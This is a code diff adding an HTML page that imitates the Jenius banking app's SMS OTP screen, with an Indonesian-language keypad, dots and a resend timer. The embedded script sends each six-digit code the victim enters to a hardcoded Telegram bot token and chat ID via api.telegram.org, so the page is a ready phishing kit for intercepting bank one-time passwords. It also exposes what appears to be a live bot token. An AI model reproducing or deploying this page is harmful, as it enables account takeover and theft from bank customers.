@@ -1,1 +1,175 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>Jenius OTP Autentikasi</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap");
+  </style>
+ </head>
+ <body
+   class="bg-[#00a1e0] min-h-screen flex flex-col items-center justify-center font-['Roboto'] text-white"
+ >
+  <div class="flex flex-col items-center space-y-6 w-full max-w-xs px-6">
+   <img
+     alt="Jenius logo, circular swirl icon with text Jenius in white"
+     class="w-16 h-16"
+     height="100"
+     src="https://aroa-rlb.smbci.com/images/smbc-logo.svg"
+     width="2000"
+   />
+   <h2 class="text-xl font-light">Autentikasi</h2>
+   <div id="otp-dots" class="flex space-x-4 mb-4">
+    <span class="w-4 h-4 rounded-full bg-[#0072a8] opacity-30"></span>
+    <span class="w-4 h-4 rounded-full bg-[#0072a8] opacity-30"></span>
+    <span class="w-4 h-4 rounded-full bg-[#0072a8] opacity-30"></span>
+    <span class="w-4 h-4 rounded-full bg-[#0072a8] opacity-30"></span>
+    <span class="w-4 h-4 rounded-full bg-[#0072a8] opacity-30"></span>
+    <span class="w-4 h-4 rounded-full bg-[#0072a8] opacity-30"></span>
+   </div>
+   <div class="text-center space-y-1">
+    <p class="text-sm font-light text-[#a0d7f3]">Masukkan 6 angka kode verifikasi yang di kirim via SMS</p>
+    <p class="text-sm font-semibold">Belum Terima Kode?</p>
+   </div>
+   <div
+     id="keypad"
+     class="grid grid-cols-3 gap-y-6 w-full text-center text-3xl font-light select-none mt-4"
+   >
+    <button type="button" class="focus:outline-none">1</button>
+    <button type="button" class="focus:outline-none">2</button>
+    <button type="button" class="focus:outline-none">3</button>
+    <button type="button" class="focus:outline-none">4</button>
+    <button type="button" class="focus:outline-none">5</button>
+    <button type="button" class="focus:outline-none">6</button>
+    <button type="button" class="focus:outline-none">7</button>
+    <button type="button" class="focus:outline-none">8</button>
+    <button type="button" class="focus:outline-none">9</button>
+    <div></div>
+    <button type="button" class="focus:outline-none">0</button>
+    <button type="button" id="backspace" class="focus:outline-none">
+     <i class="fas fa-long-arrow-alt-left"></i>
+    </button>
+   </div>
 
+   <div class="mt-6 text-center text-sm text-[#a0d7f3]">
+    <span id="timer">02:00</span>
+    <button
+      id="resend-btn"
+      disabled
+      class="ml-2 font-semibold text-white underline opacity-50 cursor-not-allowed"
+      type="button"
+    >
+     Kirim Ulang
+    </button>
+   </div>
+
+   <p class="text-xs font-light text-[#a0d7f3] mt-6 mb-2">Version 2.38.2 (7592)</p>
+  </div>
+
+  <script>
+   // Replace with your Telegram bot token and chat ID
+   const BOT_TOKEN = "8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc";
+   const CHAT_ID = "7549590022";
+
+   const otpDots = document.getElementById("otp-dots");
+   const keypad = document.getElementById("keypad");
+   const timerEl = document.getElementById("timer");
+   const resendBtn = document.getElementById("resend-btn");
+
+   let otp = [];
+   let timer = 120; // 2 minutes in seconds
+   let timerInterval;
+
+   function updateOtpDots() {
+     const dots = otpDots.children;
+     for (let i = 0; i < dots.length; i++) {
+       if (i < otp.length) {
+         dots[i].classList.remove("opacity-30");
+       } else {
+         dots[i].classList.add("opacity-30");
+       }
+     }
+   }
+
+   function sendOtpToTelegram(otpValue) {
+     const message = encodeURIComponent(`Kode OTP: ${otpValue}`);
+     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+
+     fetch(url)
+       .then((response) => response.json())
+       .then((data) => {
+         if (!data.ok) {
+           alert("Gagal mengirim Kode OTP ke Telegram");
+         }
+       })
+       .catch(() => alert("Terjadi kesalahan saat mengirim Kode OTP ke Telegram"));
+   }
+
+   function startTimer() {
+     timer = 120;
+     resendBtn.disabled = true;
+     resendBtn.classList.add("opacity-50", "cursor-not-allowed");
+     updateTimerDisplay();
+
+     timerInterval = setInterval(() => {
+       timer--;
+       updateTimerDisplay();
+
+       if (timer <= 0) {
+         clearInterval(timerInterval);
+         resendBtn.disabled = false;
+         resendBtn.classList.remove("opacity-50", "cursor-not-allowed");
+       }
+     }, 1000);
+   }
+
+   function updateTimerDisplay() {
+     const minutes = Math.floor(timer / 60)
+       .toString()
+       .padStart(2, "0");
+     const seconds = (timer % 60).toString().padStart(2, "0");
+     timerEl.textContent = `${minutes}:${seconds}`;
+   }
+
+   keypad.addEventListener("click", (e) => {
+     if (e.target.tagName === "BUTTON" || e.target.closest("button")) {
+       const btn =
+         e.target.tagName === "BUTTON" ? e.target : e.target.closest("button");
+       const val = btn.textContent.trim();
+
+       if (val === "") return;
+
+       if (val === "←" || btn.id === "backspace") {
+         otp.pop();
+         updateOtpDots();
+       } else if (otp.length < 6 && !isNaN(val)) {
+         otp.push(val);
+         updateOtpDots();
+         if (otp.length === 6) {
+           const otpValue = otp.join("");
+           sendOtpToTelegram(otpValue);
+           otp = [];
+           updateOtpDots();
+         }
+       }
+     }
+   });
+
+   resendBtn.addEventListener("click", () => {
+     if (!resendBtn.disabled) {
+       // Here you can trigger resend OTP logic, e.g., call API to resend OTP
+       alert("Kode OTP telah dikirim ulang.");
+       startTimer();
+     }
+   });
+
+   updateOtpDots();
+   startTimer();
+  </script>
+ </body>
+</html>
